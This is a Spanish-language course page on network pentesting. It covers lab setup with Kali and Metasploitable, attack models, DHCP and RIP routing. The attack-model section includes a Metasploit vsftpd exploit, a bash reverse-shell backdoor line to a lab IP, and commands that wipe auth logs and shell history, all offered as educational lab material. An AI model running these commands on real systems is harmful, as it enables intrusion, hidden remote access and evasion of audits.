| **Inicio**         | **atrÃ¡s 10**                                  | **Siguiente 12**                            |
| ------------------ | --------------------------------------------- | ------------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_10_Seguridad_de_Redes_On_Premise.md) | [â©](./7_12_Fundamentos_de_Criptografia.md) |

---

## **Ãndice**

| Temario                                                                                                                                                              |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [803. Laboratorios para el curso](#803-laboratorios-para-el-curso)                                                                                                   |
| [804. Modelo de ataques](#804-modelo-de-ataques)                                                                                                                     |
| [805. Direccionamiento dinÃ¡mico](#805-direccionamiento-dinÃ¡mico)                                                                                                     |
| [806. Protocolos de enrutamiento dinÃ¡mico](#806-protocolos-de-enrutamiento-dinÃ¡mico)                                                                                 |
| [807. ConfiguraciÃ³n de protocolos de enrutamiento dinÃ¡mico](#807-configuraciÃ³n-de-protocolos-de-enrutamiento-dinÃ¡mico)                                               |
| [808. ConfiguraciÃ³n de enrutamiento dinÃ¡mico](#808-configuraciÃ³n-de-enrutamiento-dinÃ¡mico)                                                                           |
| [809. ConfiguraciÃ³n de segundo enrutador y verificaciÃ³n de tablas de enrutamiento](#809-configuraciÃ³n-de-segundo-enrutador-y-verificaciÃ³n-de-tablas-de-enrutamiento) |
| [810. ConfiguraciÃ³n de NAT y redireccionamiento](#810-configuraciÃ³n-de-nat-y-redireccionamiento)                                                                     |
| [811. AnÃ¡lisis de DNS](#811-anÃ¡lisis-de-dns)                                                                                                                         |
| [812. ARP Poisoning](#812-arp-poisoning)                                                                                                                             |
| [813. DNS Spoofing](#813-dns-spoofing)                                                                                                                               |
| [814. DHCP Spoofing](#814-dhcp-spoofing)                                                                                                                             |
| [815. Encapsulado de paquetes con Scapy](#815-encapsulado-de-paquetes-con-scapy)                                                                                     |
| [816. Ataques a protocolos de enrutamiento](#816-ataques-a-protocolos-de-enrutamiento)                                                                               |
| [817. VerificaciÃ³n de ataques a protocolos de enrutamiento](#817-verificaciÃ³n-de-ataques-a-protocolos-de-enrutamiento)                                               |
| [818. AnÃ¡lisis de NAT](#818-anÃ¡lisis-de-nat)                                                                                                                         |
| [819. Ataque NAT Bypass](#819-ataque-nat-bypass)                                                                                                                     |
| [820. IntroducciÃ³n a la IngenierÃ­a Social](#820-introducciÃ³n-a-la-ingenierÃ­a-social)                                                                                 |
| [821. Credential Harvesting](#821-credential-harvesting)                                                                                                             |
| [822. PreparaciÃ³n de ataques con SET y Metasploit](#822-preparaciÃ³n-de-ataques-con-set-y-metasploit)                                                                 |
| [823. EjecuciÃ³n de ataques con SET y Metasploit](#823-ejecuciÃ³n-de-ataques-con-set-y-metasploit)                                                                     |
| [824. Modelo de un ataque DoS](#824-modelo-de-un-ataque-dos)                                                                                                         |
| [825. Ataques ICMP y SYN Flood](#825-ataques-icmp-y-syn-flood)                                                                                                       |
| [826. Ataques Smurf y DoS con Metasploit](#826-ataques-smurf-y-dos-con-metasploit)                                                                                   |
| [827. Ataques con LOIC](#827-ataques-con-loic)                                                                                                                       |
| [828. Pentesting con DoS](#828-pentesting-con-dos)                                                                                                                   |
| [829. ConfiguraciÃ³n de entorno para auditorÃ­a WiFi](#829-configuraciÃ³n-de-entorno-para-auditorÃ­a-wifi)                                                               |
| [830. Monitoreo de redes WiFi](#830-monitoreo-de-redes-wifi)                                                                                                         |
| [831. Ataque a WEP](#831-ataque-a-wep)                                                                                                                               |
| [832. Ataque a WPA](#832-ataque-a-wpa)                                                                                                                               |
| [833. ElaboraciÃ³n de informe](#833-elaboraciÃ³n-de-informe)                                                                                                           |

|

# **Pentesting a Redes**

## **803. Laboratorios para el curso**

### ğŸ” Â¿QuÃ© es un Laboratorio de Pentesting?

Un laboratorio de **Pentesting a redes** es un entorno controlado que simula una red real, diseÃ±ado para practicar tÃ©cnicas de hacking Ã©tico. En Ã©l puedes:

- Simular ataques de red (sniffing, MITM, ARP spoofing, escaneo de puertos, etc.)
- Analizar vulnerabilidades
- Capturar trÃ¡fico
- Hacer pruebas sin afectar redes reales

---

### ğŸ§° Herramientas y Entornos que se Usan

#### ğŸ”§ Herramientas esenciales

1. **MÃ¡quinas virtuales (VMs):**

   - **Kali Linux** (atacante)
   - **Windows 10/11**, **Windows Server** (vÃ­ctimas)
   - **Metasploitable 2 o 3** (vÃ­ctima vulnerable)
   - **OWASP Broken Web Apps** (opcional)

2. **Virtualizador**:

   - **VirtualBox** (gratuito) o **VMware Workstation/Player**

3. **Red interna/NAT**: Para que las mÃ¡quinas estÃ©n en una red simulada y no puedan afectar tu red real.

---

### ğŸ—ï¸ CÃ³mo Instalar el Laboratorio Paso a Paso

#### 1ï¸âƒ£ Instalar VirtualBox

1. Descarga desde: [https://www.virtualbox.org](https://www.virtualbox.org)
2. Instala normalmente como cualquier programa.

---

#### 2ï¸âƒ£ Descargar las imÃ¡genes de las mÃ¡quinas virtuales

- **Kali Linux**:

  ğŸ‘‰ [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
  (elige la versiÃ³n VirtualBox)

- **Metasploitable 2**:

  ğŸ‘‰ [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

- **Windows (opcional)**:

  Puedes usar una versiÃ³n de evaluaciÃ³n:
  ğŸ‘‰ [https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

---

#### 3ï¸âƒ£ Importar las mÃ¡quinas virtuales

En VirtualBox:

1. `Archivo` > `Importar servicio virtualizado`
2. Selecciona el archivo `.ova` (por ejemplo, el de Kali o Metasploitable)
3. Siguiente > Aceptar > Importar

Hazlo con cada VM que quieras usar.

---

#### 4ï¸âƒ£ Configurar la red

1. Abre VirtualBox.
2. Ve a `Archivo` > `ConfiguraciÃ³n` > `Red` > `Redes solo-anfitriÃ³n` o crea una red NAT.
3. AsegÃºrate de que todas las mÃ¡quinas usen **la misma red interna** o â€œadaptador solo-anfitriÃ³nâ€.

Ejemplo:

- En cada VM > `ConfiguraciÃ³n` > `Red`:

  - Activar adaptador
  - Tipo: **Red Interna**
  - Nombre: por ejemplo: `LabPentest`

AsÃ­ todas estarÃ¡n en la misma red aislada.

---

#### 5ï¸âƒ£ Verifica que las mÃ¡quinas se comuniquen

En Kali, abre una terminal y escribe:

```bash
ping 192.168.56.101
```

(Suponiendo que esa sea la IP de Metasploitable)

Debe responder con paquetes `icmp`, como:

```
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.476 ms
```

---

### âœ… Ejemplo completo: Escaneo de red con Kali y Metasploitable

#### ğŸ” Objetivo: Escanear puertos abiertos en Metasploitable desde Kali

1. AsegÃºrate de que ambas mÃ¡quinas estÃ©n encendidas y en la misma red.
2. En Kali, abre una terminal.

Primero identifica la IP de Metasploitable:

```bash
ip a
```

3. Escanea la IP con Nmap:

```bash
nmap -sS -sV 192.168.56.101
```

Esto harÃ¡:

- `-sS`: escaneo TCP SYN
- `-sV`: detecta versiones de servicios

#### ğŸ§¾ Resultado esperado (ejemplo):

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8
```

Â¡Ya tienes servicios identificados para hacer pruebas!

---

### ğŸ§ª Retos que puedes hacer en tu laboratorio

1. Escaneo completo de puertos y servicios
2. Ataques de fuerza bruta a FTP, SSH
3. Exploits con Metasploit
4. Sniffing de trÃ¡fico con Wireshark
5. MITM con Ettercap o ARP spoofing

---

### ğŸ Bonus: Laboratorios listos para usar

TambiÃ©n puedes usar:

- [TryHackMe](https://tryhackme.com) â€” Tiene laboratorios en la nube.
- [Hack The Box](https://www.hackthebox.com) â€” Para retos avanzados.
- [VulnHub](https://www.vulnhub.com) â€” VMs vulnerables para practicar.

---

### ğŸ“Œ ConclusiÃ³n

Un laboratorio de Pentesting es esencial para aprender de forma prÃ¡ctica y segura. Puedes montarlo fÃ¡cilmente con VirtualBox, Kali y Metasploitable. Te permite practicar muchas tÃ©cnicas reales sin riesgos legales o tÃ©cnicos.

---

[ğŸ”¼](#Ã­ndice)

---

## **804. Modelo de ataques**

### ğŸ§  Â¿QuÃ© es un Modelo de Ataques?

Un **modelo de ataques** es una forma estructurada de describir **cÃ³mo un atacante real podrÃ­a comprometer un sistema o red**. Es un **esquema lÃ³gico y organizado** que nos ayuda a:

- Entender el **comportamiento del atacante**
- Identificar las **vulnerabilidades**
- Evaluar los **impactos** potenciales
- DiseÃ±ar **defensas mÃ¡s efectivas**

---

### ğŸ“Š Tipos de modelos de ataque mÃ¡s comunes

#### 1. ğŸ”„ Modelo en fases (Kill Chain)

Basado en el ciclo de vida del ataque. Cada paso refleja una acciÃ³n del atacante.

1. **Reconocimiento (Recon)**: Recolectar informaciÃ³n del objetivo (IPs, dominios).
2. **Escaneo (Scanning)**: Identificar servicios, puertos, sistemas operativos.
3. **Acceso (Gaining Access)**: Explotar vulnerabilidades para entrar.
4. **Mantener el acceso (Persistence)**: Crear puertas traseras.
5. **Escalada de privilegios**: Obtener mÃ¡s poder (admin/root).
6. **Cubrir rastros**: Borrar logs, esconder malware.

ğŸ“Œ Este modelo es ideal para simulaciones en laboratorios de Pentesting.

---

#### 2. ğŸ§¬ MITRE ATT\&CK

Un modelo mÃ¡s detallado, con **tÃ©cnicas y tÃ¡cticas** especÃ­ficas usadas por atacantes reales.

- TÃ¡cticas (objetivo del atacante): Ej: "Acceso inicial", "EvasiÃ³n de defensa"
- TÃ©cnicas (cÃ³mo lo hacen): Ej: "Phishing", "ExplotaciÃ³n de servicios remotos"

ğŸ‘‰ Sitio oficial: [https://attack.mitre.org/](https://attack.mitre.org/)

---

#### 3. ğŸ° STRIDE (Microsoft)

Modelo usado en anÃ¡lisis de amenazas:

| Letra | Significado             | Tipo de amenaza           |
| ----- | ----------------------- | ------------------------- |
| S     | Spoofing                | SuplantaciÃ³n de identidad |
| T     | Tampering               | AlteraciÃ³n de datos       |
| R     | Repudiation             | NegaciÃ³n de acciones      |
| I     | Information Disclosure  | Fuga de informaciÃ³n       |
| D     | Denial of Service       | Ataques de disponibilidad |
| E     | Elevation of Privileges | Subir de permisos         |

---

### ğŸ§° Â¿CÃ³mo se instala o simula un modelo de ataque?

#### Requisitos:

- **VirtualBox** o VMware
- VMs: **Kali Linux (atacante)** + **Metasploitable 2 o Windows (vÃ­ctima)**
- Red interna: ambas mÃ¡quinas conectadas entre sÃ­ pero aisladas

---

### ğŸ§ª Ejemplo prÃ¡ctico de un Modelo de Ataque usando el modelo de Kill Chain

#### ğŸ” Fase 1: Reconocimiento

En Kali, usamos `whois`, `nslookup`, o `nmap` para recolectar informaciÃ³n:

```bash
nmap -sP 192.168.56.0/24
```

Esto muestra quÃ© IPs estÃ¡n activas en tu red simulada.

---

#### ğŸ” Fase 2: Escaneo

Identificamos puertos abiertos y servicios:

```bash
nmap -sS -sV 192.168.56.101
```

Resultado ejemplo:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1
```

---

#### ğŸ¯ Fase 3: Gaining Access

Usamos Metasploit para explotar una vulnerabilidad conocida en FTP:

```bash
msfconsole
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
run
```

ğŸ’¥ Â¡Acceso root conseguido!

---

#### ğŸ”’ Fase 4: Mantener Acceso

Creamos una puerta trasera (backdoor):

```bash
echo "bash -i >& /dev/tcp/192.168.56.102/4444 0>&1" >> /tmp/.backdoor.sh
```

Y la configuramos para ejecutarse automÃ¡ticamente.

---

#### ğŸ§— Fase 5: Escalada de Privilegios

Si accedimos como usuario, usamos herramientas como `linpeas.sh` o `sudo -l` para ver vulnerabilidades.

---

#### ğŸ§¹ Fase 6: Cubrir Huellas

Limpiamos logs:

```bash
echo > /var/log/auth.log
```

O borramos historial:

```bash
history -c
```

---

### âœ… Resultado Final

Has simulado un ataque real paso a paso, desde reconocimiento hasta ocultamiento, siguiendo el **modelo Kill Chain**. Este enfoque te permite estudiar cada etapa con profundidad y reforzar tus habilidades de anÃ¡lisis, defensa y ataque.

---

### ğŸ§ª BONUS: Actividad para tu laboratorio

Crea una tabla como esta para documentar cada paso:

| Fase           | Herramienta usada | Comando / TÃ©cnica          | Resultado                      |
| -------------- | ----------------- | -------------------------- | ------------------------------ |
| Reconocimiento | Nmap              | `nmap -sP 192.168.56.0/24` | IP de Metasploitable detectada |
| Escaneo        | Nmap              | `nmap -sS -sV`             | Puertos 21, 22 abiertos        |
| Acceso         | Metasploit        | Exploit vsftpd 2.3.4       | Acceso root                    |
| Persistencia   | Bash              | Script de backdoor         | Puerta trasera instalada       |
| Escalada       | LinPEAS           | ./linpeas.sh               | Permisos sudo detectados       |
| Borrar huellas | Bash              | `history -c`               | Rastro eliminado               |

---

[ğŸ”¼](#Ã­ndice)

---

## **805. Direccionamiento dinÃ¡mico**

### ğŸ“¡ Â¿QuÃ© es el Direccionamiento DinÃ¡mico?

El **direccionamiento dinÃ¡mico** es un mÃ©todo en el que las computadoras de una red reciben su **direcciÃ³n IP automÃ¡ticamente**, sin necesidad de que el administrador la configure manualmente.

Este proceso lo hace un **servidor DHCP (Dynamic Host Configuration Protocol)**.

---

### ğŸ§  Â¿CÃ³mo funciona?

1. Una computadora (cliente) se conecta a la red.
2. EnvÃ­a una solicitud **DHCP Discover** preguntando: "Â¿Alguien puede darme una IP?"
3. El servidor DHCP responde con una oferta de IP.
4. El cliente acepta y el servidor le asigna la IP por un tiempo (lease time).

---

### ğŸ“¦ Â¿QuÃ© datos entrega un servidor DHCP?

- IP del cliente
- MÃ¡scara de subred
- Puerta de enlace (gateway)
- Servidor DNS
- Tiempo de concesiÃ³n

---

### ğŸ–¥ï¸ Â¿DÃ³nde se usa el direccionamiento dinÃ¡mico?

- En oficinas y empresas: para que los dispositivos obtengan IPs automÃ¡ticamente.
- En casa: tu router es el servidor DHCP.
- En laboratorios: para simular redes reales sin asignar IPs manualmente.

---

### ğŸ› ï¸ Â¿CÃ³mo se instala y configura un servidor DHCP?

#### âœ… OpciÃ³n 1: En Linux (Ubuntu o Debian)

Vamos a instalar un servidor DHCP con `isc-dhcp-server`.

##### ğŸ”§ Paso 1: Instalar el servidor DHCP

```bash
sudo apt update
sudo apt install isc-dhcp-server
```

##### ğŸ”§ Paso 2: Configurar el archivo DHCP

Editar el archivo de configuraciÃ³n:

```bash
sudo nano /etc/dhcp/dhcpd.conf
```

Ejemplo bÃ¡sico de configuraciÃ³n:

```conf
subnet 192.168.10.0 netmask 255.255.255.0 {
  range 192.168.10.100 192.168.10.200;
  option routers 192.168.10.1;
  option domain-name-servers 8.8.8.8;
  default-lease-time 600;
  max-lease-time 7200;
}
```

##### ğŸ”§ Paso 3: Configurar la interfaz de red

Editar:

```bash
sudo nano /etc/default/isc-dhcp-server
```

Agrega la interfaz que se usarÃ¡ (por ejemplo, `eth1`):

```bash
INTERFACESv4="eth1"
```

##### ğŸ”§ Paso 4: Reiniciar el servicio

```bash
sudo systemctl restart isc-dhcp-server
sudo systemctl status isc-dhcp-server
```

---

#### âœ… OpciÃ³n 2: En un router domÃ©stico o un laboratorio virtual

Si usas un router virtual o fÃ­sico:

- Entra a su panel de configuraciÃ³n (normalmente en 192.168.1.1).
- Busca la secciÃ³n **DHCP Server**.
- HabilÃ­talo y define un rango de direcciones (por ejemplo, 192.168.1.100 a 192.168.1.200).

---

### ğŸ§ª Ejemplo prÃ¡ctico completo

#### ğŸ¯ Objetivo: Configurar un servidor DHCP en Kali Linux y que una mÃ¡quina Windows reciba IP dinÃ¡mica

---

#### ğŸ§± Requisitos

- Kali Linux (servidor DHCP)
- Windows 10 (cliente)
- VirtualBox o VMware
- Red interna (ambas mÃ¡quinas en la misma red: `red_lab_dhcp`)

---

#### âš™ï¸ Paso a paso

##### ğŸ“Œ En Kali Linux:

1. Instala el servidor:

```bash
sudo apt install isc-dhcp-server
```

2. Edita el archivo `/etc/dhcp/dhcpd.conf`:

```conf
subnet 192.168.50.0 netmask 255.255.255.0 {
  range 192.168.50.100 192.168.50.150;
  option routers 192.168.50.1;
  option domain-name-servers 8.8.8.8;
  default-lease-time 600;
  max-lease-time 7200;
}
```

3. Asigna la IP estÃ¡tica a Kali en la interfaz `eth1` (la de la red interna):

```bash
sudo ip addr add 192.168.50.1/24 dev eth1
sudo ip link set eth1 up
```

4. Edita el archivo `/etc/default/isc-dhcp-server`:

```bash
INTERFACESv4="eth1"
```

5. Reinicia el servicio:

```bash
sudo systemctl restart isc-dhcp-server
```

---

##### ğŸ–¥ï¸ En Windows 10:

1. AsegÃºrate de que estÃ© conectada a la red `red_lab_dhcp` (la misma que Kali).
2. Ve a `ConfiguraciÃ³n de red` > `Adaptador de red`.
3. Verifica que estÃ© configurada en â€œObtener IP automÃ¡ticamenteâ€.
4. Ejecuta `cmd` > `ipconfig` y deberÃ­as ver algo asÃ­:

```
Adaptador Ethernet:
   DirecciÃ³n IPv4 . . . . . . . . . . : 192.168.50.101
   MÃ¡scara de subred . . . . . . . . .: 255.255.255.0
   Puerta de enlace predeterminada . .: 192.168.50.1
```

âœ… Â¡Tu cliente ya recibiÃ³ IP dinÃ¡mica desde el servidor Kali!

---

### ğŸ§  Â¿Por quÃ© es importante el direccionamiento dinÃ¡mico?

- Escalable: no necesitas configurar cientos de IPs manualmente.
- AutomÃ¡tico: menos errores humanos.
- Flexible: ideal para redes grandes, laboratorios, WiFi, oficinas.

---

### ğŸ“Œ ConclusiÃ³n

El **direccionamiento dinÃ¡mico (DHCP)** permite automatizar la asignaciÃ³n de IPs, facilitando la administraciÃ³n de redes. Con herramientas como `isc-dhcp-server` puedes montar tu propio servidor en Linux para simular redes reales y practicar administraciÃ³n o seguridad.

---

[ğŸ”¼](#Ã­ndice)

---

## **806. Protocolos de enrutamiento dinÃ¡mico**

### ğŸŒ Â¿QuÃ© son los Protocolos de Enrutamiento DinÃ¡mico?

Un **protocolo de enrutamiento dinÃ¡mico** permite que los **routers aprendan automÃ¡ticamente las rutas hacia otras redes**, sin que el administrador tenga que ingresar esas rutas a mano.

> ğŸ“Œ Son muy Ãºtiles en redes grandes, que cambian constantemente o que necesitan adaptaciÃ³n automÃ¡tica.

---

### ğŸ“¦ Â¿CÃ³mo funciona el enrutamiento dinÃ¡mico?

1. Cada router se comunica con los routers vecinos.
2. Comparte la informaciÃ³n de las rutas que conoce.
3. Cada router construye su propia **tabla de enrutamiento**.
4. Si cambia la red (un router cae, una red se aÃ±ade), los protocolos actualizan las rutas automÃ¡ticamente.

---

### ğŸ§  Ventajas del enrutamiento dinÃ¡mico

- âš¡ Se adapta a cambios en la red automÃ¡ticamente.
- âœ… Reduce errores de configuraciÃ³n.
- ğŸ“Š Escalable para redes grandes.
- ğŸ” Detecta y evita rutas caÃ­das.

---

### ğŸ§­ Tipos de Protocolos de Enrutamiento DinÃ¡mico

Los mÃ¡s comunes se dividen en dos grupos:

| Tipo                       | Protocolos  | CaracterÃ­sticas principales                     |
| -------------------------- | ----------- | ----------------------------------------------- |
| **Vector distancia**       | RIP, IGRP   | Simples, usan "saltos" como mÃ©trica             |
| **Estado de enlace**       | OSPF, IS-IS | MÃ¡s complejos, rÃ¡pidos, usan costo como mÃ©trica |
| **HÃ­bridos**               | EIGRP       | Combina lo mejor de ambos                       |
| **Exteriores (entre ISP)** | BGP         | Usado en Internet (entre organizaciones)        |

---

### ğŸ› ï¸ Â¿CÃ³mo se instalan y configuran?

Vamos a usar **GNS3** o **Packet Tracer** para simular redes con routers, o incluso **mÃ¡quinas Linux con software de enrutamiento como `Quagga` o `FRRouting`**.

---

### âœ… OPCIÃ“N 1: Usando **Cisco Packet Tracer** (fÃ¡cil, ideal para estudiantes)

#### ğŸ“¥ Paso 1: Instalar Packet Tracer

- Descargar desde: [https://skillsforall.com](https://skillsforall.com)
- Requiere registro gratuito.

---

#### ğŸ“¦ Paso 2: Crear una topologÃ­a

1. Agrega **2 o mÃ¡s routers**, **switches**, y **PCs**.
2. ConÃ©ctalos con cables apropiados.
3. Asigna direcciones IP a las interfaces.
4. Habilita las interfaces con `no shutdown`.

---

### ğŸ§ª Ejemplo completo: Enrutamiento dinÃ¡mico con RIP (Routing Information Protocol)

#### ğŸ¯ Objetivo:

Conectar dos redes usando **RIP** para que los PCs puedan comunicarse sin usar rutas estÃ¡ticas.

---

#### ğŸ”§ TopologÃ­a:

```
PC1 --- R1 --- R2 --- PC2

Red 1: 192.168.1.0/24
Red 2: 10.0.0.0/24
```

---

#### ğŸ“Œ Paso a paso en cada router (en Cisco Packet Tracer):

##### ğŸ”¹ En R1:

```plaintext
Router> enable
Router# configure terminal
Router(config)# interface fastEthernet0/0
Router(config-if)# ip address 192.168.1.1 255.255.255.0
Router(config-if)# no shutdown

Router(config)# interface fastEthernet0/1
Router(config-if)# ip address 192.168.2.1 255.255.255.0
Router(config-if)# no shutdown

Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# network 192.168.1.0
Router(config-router)# network 192.168.2.0
Router(config-router)# no auto-summary
```

---

##### ğŸ”¹ En R2:

```plaintext
Router> enable
Router# configure terminal
Router(config)# interface fastEthernet0/0
Router(config-if)# ip address 192.168.2.2 255.255.255.0
Router(config-if)# no shutdown

Router(config)# interface fastEthernet0/1
Router(config-if)# ip address 10.0.0.1 255.255.255.0
Router(config-if)# no shutdown

Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# network 192.168.2.0
Router(config-router)# network 10.0.0.0
Router(config-router)# no auto-summary
```

---

##### ğŸ”¹ En los PCs

- PC1: IP 192.168.1.2, Gateway 192.168.1.1
- PC2: IP 10.0.0.2, Gateway 10.0.0.1

---

#### ğŸ” Verificar conectividad

1. Desde PC1, haz `ping 10.0.0.2`.
2. DeberÃ­a responder. Esto demuestra que **los routers se estÃ¡n comunicando por RIP y han aprendido las rutas automÃ¡ticamente**.

---

### âœ… OPCIÃ“N 2: En Linux (mÃ¡s avanzado)

Puedes usar `FRRouting` o `Quagga` para implementar protocolos como **RIP**, **OSPF** u **BGP**.

Ejemplo en Debian/Ubuntu:

```bash
sudo apt install frr frr-ripd
```

Activar el daemon RIP:

```bash
sudo nano /etc/frr/daemons
# Cambia: ripd=yes
```

Configurar en `/etc/frr/frr.conf` o con comandos vtysh:

```bash
sudo vtysh

conf t
router rip
 network 192.168.1.0/24
 network 10.0.0.0/24
```

---

### ğŸ§  Diferencias clave entre RIP y OSPF

| CaracterÃ­stica | RIP              | OSPF                   |
| -------------- | ---------------- | ---------------------- |
| Tipo           | Vector distancia | Estado de enlace       |
| MÃ©trica        | NÃºmero de saltos | Costo (ancho de banda) |
| Convergencia   | Lenta            | RÃ¡pida                 |
| Escalabilidad  | Baja             | Alta                   |
| MÃ¡x. saltos    | 15               | Ilimitado              |

---

### ğŸ“Œ ConclusiÃ³n

Los **protocolos de enrutamiento dinÃ¡mico** permiten que los routers intercambien informaciÃ³n de forma automÃ¡tica. Son ideales para redes medianas o grandes, donde las rutas cambian o se agregan nodos con frecuencia. Con herramientas como **Packet Tracer** o **FRRouting en Linux**, puedes simular estos protocolos y practicar en tu laboratorio.

---

[ğŸ”¼](#Ã­ndice)

---

## **807. ConfiguraciÃ³n de protocolos de enrutamiento dinÃ¡mico**

### ğŸŒ Â¿QuÃ© es la ConfiguraciÃ³n de Protocolos de Enrutamiento DinÃ¡mico?

Configurar un **protocolo de enrutamiento dinÃ¡mico** significa enseÃ±ar a un **router** a **aprender y compartir rutas automÃ¡ticamente con otros routers**, sin necesidad de ingresar rutas estÃ¡ticas a mano.

Esto se usa mucho en redes medianas y grandes porque:

âœ… Se adapta automÃ¡ticamente

âœ… Es mÃ¡s fÃ¡cil de mantener

âœ… Permite la detecciÃ³n rÃ¡pida de fallas en la red

---

### ğŸ”„ Â¿QuÃ© protocolos se pueden configurar?

Los mÃ¡s usados son:

| Protocolo | Tipo             | FÃ¡cil de configurar | CaracterÃ­sticas clave                    |
| --------- | ---------------- | ------------------- | ---------------------------------------- |
| **RIP**   | Vector Distancia | âœ… SÃ­               | MÃ©trica: saltos, simple, hasta 15 saltos |
| **OSPF**  | Estado de Enlace | âŒ MÃ¡s complejo     | MÃ©trica: costo (ancho de banda), rÃ¡pido  |
| **EIGRP** | HÃ­brido (Cisco)  | âœ… Medio            | MÃ©tricas compuestas, muy eficiente       |

---

### ğŸ› ï¸ Â¿DÃ³nde se puede configurar?

#### 1. âœ… **Simuladores de red** (fÃ¡cil para practicar):

- **Cisco Packet Tracer**
- **GNS3**

#### 2. âœ… **Routers reales Cisco / MikroTik**

#### 3. âœ… **Linux** con software de enrutamiento (FRRouting, Quagga)

---

### ğŸ“¦ Â¿QuÃ© se necesita para el laboratorio?

- 2 routers virtuales (R1 y R2)
- 2 PCs (PC1 y PC2)
- Redes conectadas:

  - PC1 â€” R1 â€” R2 â€” PC2

- Direccionamiento IP:

  - Red A: 192.168.1.0/24 (PC1 a R1)
  - Red B: 10.0.0.0/24 (PC2 a R2)
  - Red entre R1 y R2: 192.168.2.0/30

---

### âš™ï¸ ConfiguraciÃ³n paso a paso: RIP

#### ğŸ’¡ Â¿Por quÃ© RIP?

Porque es el **mÃ¡s fÃ¡cil de configurar** y excelente para entender el concepto de enrutamiento dinÃ¡mico.

---

### ğŸ“¥ PASO 1: Preparar la topologÃ­a en Cisco Packet Tracer

#### TopologÃ­a:

```
[PC1] â€” [R1] â€” [R2] â€” [PC2]

PC1: 192.168.1.2/24         PC2: 10.0.0.2/24
R1: G0/0 â€“ 192.168.1.1       R2: G0/1 â€“ 10.0.0.1
    G0/1 â€“ 192.168.2.1           G0/0 â€“ 192.168.2.2
```

---

### ğŸ“Œ PASO 2: Configurar IPs en R1 y R2

#### En R1:

```plaintext
Router> enable
Router# configure terminal
Router(config)# interface gigabitEthernet0/0
Router(config-if)# ip address 192.168.1.1 255.255.255.0
Router(config-if)# no shutdown

Router(config)# interface gigabitEthernet0/1
Router(config-if)# ip address 192.168.2.1 255.255.255.252
Router(config-if)# no shutdown
```

#### En R2:

```plaintext
Router> enable
Router# configure terminal
Router(config)# interface gigabitEthernet0/0
Router(config-if)# ip address 192.168.2.2 255.255.255.252
Router(config-if)# no shutdown

Router(config)# interface gigabitEthernet0/1
Router(config-if)# ip address 10.0.0.1 255.255.255.0
Router(config-if)# no shutdown
```

---

### ğŸ“Œ PASO 3: Configurar RIP en R1 y R2

#### En R1:

```plaintext
Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# no auto-summary
Router(config-router)# network 192.168.1.0
Router(config-router)# network 192.168.2.0
```

#### En R2:

```plaintext
Router(config)# router rip
Router(config-router)# version 2
Router(config-router)# no auto-summary
Router(config-router)# network 192.168.2.0
Router(config-router)# network 10.0.0.0
```

---

### ğŸ“Œ PASO 4: Configurar las PCs

- **PC1:**

  - IP: 192.168.1.2
  - MÃ¡scara: 255.255.255.0
  - Gateway: 192.168.1.1

- **PC2:**

  - IP: 10.0.0.2
  - MÃ¡scara: 255.255.255.0
  - Gateway: 10.0.0.1

---

### ğŸ§ª PASO 5: Probar conectividad

Desde **PC1**, abre el terminal y escribe:

```bash
ping 10.0.0.2
```

Resultado esperado:

```
Reply from 10.0.0.2: bytes=32 time<1ms TTL=255
```

âœ… Â¡Ã‰xito! Los routers se han comunicado, **han intercambiado rutas usando RIP** y las PCs se ven entre sÃ­.

---

### ğŸ“– Â¿QuÃ© aprendiste?

- QuÃ© es un protocolo de enrutamiento dinÃ¡mico.
- CÃ³mo funciona RIP (Routing Information Protocol).
- CÃ³mo configurar routers para que aprendan rutas automÃ¡ticamente.
- CÃ³mo verificar que las rutas funcionen correctamente.

---

[ğŸ”¼](#Ã­ndice)

---

## **808. ConfiguraciÃ³n de enrutamiento dinÃ¡mico**

### ğŸ“¡ Â¿QuÃ© es el Enrutamiento DinÃ¡mico?

El **enrutamiento dinÃ¡mico** es una tÃ©cnica que permite a los **routers aprender automÃ¡ticamente las rutas** hacia otras redes **sin necesidad de configurarlas manualmente** (como ocurre con el enrutamiento estÃ¡tico).

> ğŸ“Œ En vez de ingresar las rutas manualmente, los routers se comunican entre ellos usando **protocolos de enrutamiento** y actualizan sus tablas automÃ¡ticamente.

---

### ğŸ¤– Â¿QuÃ© hace el enrutamiento dinÃ¡mico?

- Intercambia informaciÃ³n de red con otros routers
- Detecta cambios en la topologÃ­a
- Se adapta automÃ¡ticamente a esos cambios
- Elige la mejor ruta segÃºn su mÃ©trica (distancia, ancho de banda, etc.)

---

### ğŸ” Protocolos comunes usados para enrutamiento dinÃ¡mico

| Protocolo | Tipo                | MÃ©trica usada          | Dificultad de configuraciÃ³n |
| --------- | ------------------- | ---------------------- | --------------------------- |
| **RIP**   | Vector de distancia | NÃºmero de saltos       | FÃ¡cil âœ…                    |
| **OSPF**  | Estado de enlace    | Costo (ancho de banda) | Medio/avanzado âŒâœ…         |
| **EIGRP** | HÃ­brido (Cisco)     | MÃ©tricas compuestas    | Medio âœ…                    |

---

### ğŸ§° Â¿QuÃ© necesitas para practicar?

#### OpciÃ³n A â€“ ğŸ§ª Packet Tracer (mÃ¡s simple)

- 2 routers (R1 y R2)
- 2 PCs (PC1 y PC2)
- Cableado entre ellos
- ConfiguraciÃ³n IP en cada interfaz

#### OpciÃ³n B â€“ ğŸ§° GNS3 o VirtualBox con Linux (mÃ¡s avanzado)

---

### ğŸ› ï¸ Â¿CÃ³mo se instala y configura el enrutamiento dinÃ¡mico?

#### Usaremos RIP porque es el **mÃ¡s fÃ¡cil de entender y configurar**.

---

